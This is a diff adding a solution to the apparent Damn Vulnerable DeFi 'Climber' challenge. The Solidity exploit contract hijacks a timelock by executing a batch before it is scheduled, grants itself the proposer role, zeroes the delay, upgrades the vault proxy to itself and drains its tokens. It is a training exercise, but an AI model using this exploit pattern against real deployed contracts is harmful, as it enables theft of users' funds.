@@ -85,7 +85,9 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        AttackClimber attackClimber = new AttackClimber(vault, timelock);
+        attackClimber.attack();
+        address(vault).call(abi.encodeWithSelector(AttackClimber.sweep.selector, token, recovery));
     }
 
     /**
@@ -94,5 +96,68 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract AttackClimber {
+    ClimberVault vault;
+    ClimberTimelock timelock;
+
+    constructor(ClimberVault _vault, ClimberTimelock _timelock) {
+        vault = _vault;
+        timelock = _timelock;
+    }
+
+    function schedule() external {
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+
+        targets[0] = address(timelock);
+        dataElements[0] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1,
+            address(this)
+        );
+        targets[1] = address(timelock);
+        dataElements[1] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
+
+        targets[2] = address(this);
+        dataElements[2] = abi.encodeWithSelector(AttackClimber.schedule.selector);
+
+        targets[3] = address(vault);
+        dataElements[3] = abi.encodeWithSelector(vault.upgradeToAndCall.selector, address(this), "");
+
+        timelock.schedule(targets, values, dataElements, 0);
+    }
+
+    function attack() external {
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+
+        targets[0] = address(timelock);
+        dataElements[0] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1,
+            address(this)
+        );
+        targets[1] = address(timelock);
+        dataElements[1] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
+
+        targets[2] = address(this);
+        dataElements[2] = abi.encodeWithSelector(AttackClimber.schedule.selector);
+
+        targets[3] = address(vault);
+        dataElements[3] = abi.encodeWithSelector(vault.upgradeToAndCall.selector, address(this), "");
+        timelock.execute(targets, values, dataElements, 0);
+    }
+
+    function sweep(DamnValuableToken token, address recovery) external {
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+
+    function proxiableUUID() external pure returns (bytes32) {
+        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
     }
 }
